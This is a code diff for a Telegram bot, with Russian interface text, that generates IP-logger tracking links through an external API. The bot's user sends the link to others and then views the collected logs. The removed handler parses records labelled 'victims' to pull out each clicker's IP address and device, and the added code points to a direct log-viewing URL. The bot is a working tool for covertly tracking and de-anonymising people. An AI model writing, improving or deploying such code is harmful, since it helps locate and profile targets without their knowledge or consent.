@@ -1677,10 +1677,6 @@ def handle_callback(call):
     elif call.data == "menu_logger":
         chat_id = call.message.chat.id
         try:
-            bot.delete_message(chat_id, call.message.message_id)
-        except:
-            pass
-        try:
             r = requests.get(API_LOGGER_GENERATOR, timeout=10)
             if r.status_code == 200:
                 data = r.json()
@@ -1688,12 +1684,13 @@ def handle_callback(call):
                 token = data.get("token")
                 
                 if link and token:
+                    view_url = f"{API_LOGGER_VIEW}{token}"
                     text = (
                         f"🎭 Ваш логгер создан!\n\n"
-                        f"🔗 Ссылка для отправки:\n{link}"
+                        f"🔗 Ссылка для отправки:\n{link}\n\n"
+                        f"📊 Посмотреть логи:\n{view_url}"
                     )
                     markup = types.InlineKeyboardMarkup()
-                    markup.add(types.InlineKeyboardButton("📊 Получить лог", callback_data=f"get_log_{token}"))
                     markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="menu_enter"))
                     bot.send_message(chat_id, text, reply_markup=markup)
                 else:
@@ -1702,56 +1699,6 @@ def handle_callback(call):
                 bot.send_message(chat_id, f"❌ Ошибка API: {r.status_code}")
         except Exception as e:
             bot.send_message(chat_id, f"❌ Ошибка при создании логгера: {e}")
-        bot.answer_callback_query(call.id)
-    elif call.data.startswith("get_log_"):
-        token = call.data.replace("get_log_", "")
-        chat_id = call.message.chat.id
-        try:
-            view_url = f"{API_LOGGER_VIEW}{token}"
-            r = requests.get(view_url, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                
-                # ====== ПАРСИМ КАК В LOGGER.PY ======
-                visitors = None
-                if isinstance(data, dict):
-                    for key in ['visitors', 'victims', 'data', 'results', 'logs', 'ogs']:
-                        if key in data:
-                            visitors = data[key]
-                            break
-                    if visitors is None and len(data) > 0:
-                        visitors = [data]
-                elif isinstance(data, list):
-                    visitors = data
-                
-                if visitors and isinstance(visitors, list) and len(visitors) > 0:
-                    first = visitors[0]
-                    
-                    if isinstance(first, dict):
-                        ip = first.get('ip', first.get('ip_address', first.get('v', 'Неизвестно')))
-                        user_agent = first.get('user_agent', first.get('ua', first.get('device', 'Неизвестно')))
-                        if 'Android' in user_agent or 'iPhone' in user_agent or 'iPad' in user_agent:
-                            device = user_agent
-                        else:
-                            device = user_agent[:50] + '...' if len(user_agent) > 50 else user_agent
-                    else:
-                        ip = "Неизвестно"
-                        device = "Неизвестно"
-                    
-                    text = (
-                        f"📊 **Лог получен!**\n\n"
-                        f"🌐 IP: {ip}\n"
-                        f"📱 Устройство: {device}"
-                    )
-                    markup = types.InlineKeyboardMarkup()
-                    markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="menu_enter"))
-                    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
-                else:
-                    bot.send_message(chat_id, "📭 Пока нет переходов по вашей ссылке.")
-            else:
-                bot.send_message(chat_id, f"❌ Ошибка API: {r.status_code}")
-        except Exception as e:
-            bot.send_message(chat_id, f"❌ Ошибка: {e}")
         bot.answer_callback_query(call.id)
     elif call.data.startswith("generate_photo_"):
         parts = call.data.split("_")
